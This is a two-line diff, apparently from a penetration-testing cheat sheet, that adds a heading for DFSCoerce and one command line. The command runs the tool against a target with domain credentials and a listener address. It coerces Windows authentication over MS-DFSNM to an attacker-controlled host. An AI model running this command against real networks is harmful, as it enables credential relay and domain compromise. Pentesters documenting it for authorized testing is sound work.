@@ -1,0 +1,2 @@
+# DFSCoerce — Coercion via MS-DFSNM
+python3 dfscoerce.py -u $USER -p $PASSWORD -d $DOMAIN $LISTENER_IP $TARGET_IP
